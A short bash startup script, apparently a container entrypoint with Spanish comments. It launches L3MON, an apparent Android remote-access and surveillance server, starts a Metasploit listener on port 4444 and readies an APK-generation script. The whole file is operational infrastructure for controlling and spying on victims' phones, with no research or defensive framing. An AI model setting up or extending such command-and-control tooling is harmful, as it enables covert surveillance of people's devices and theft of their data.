#!/bin/bash

echo "Iniciando servicios..."

# Iniciar L3MON
cd /root/L3MON-2
node index.js &
L3MON_PID=$!
echo "L3MON iniciado con PID: $L3MON_PID"

# Iniciar listener de Metasploit si existe el script
if [ -f "/start_listener.sh" ]; then
    chmod +x /start_listener.sh
    /start_listener.sh 4444
fi

# Iniciar script de generación de APK si existe
if [ -f "/generate_apk.sh" ]; then
    chmod +x /generate_apk.sh
fi

# Función para manejar señales de terminación
cleanup() {
    echo "Deteniendo servicios..."
    kill $L3MON_PID 2>/dev/null
    if [ -f "/tmp/msf_listener.pid" ]; then
        kill $(cat /tmp/msf_listener.pid) 2>/dev/null
    fi
    exit 0
}

trap cleanup SIGTERM SIGINT

# Mantener el contenedor vivo
tail -f /dev/null
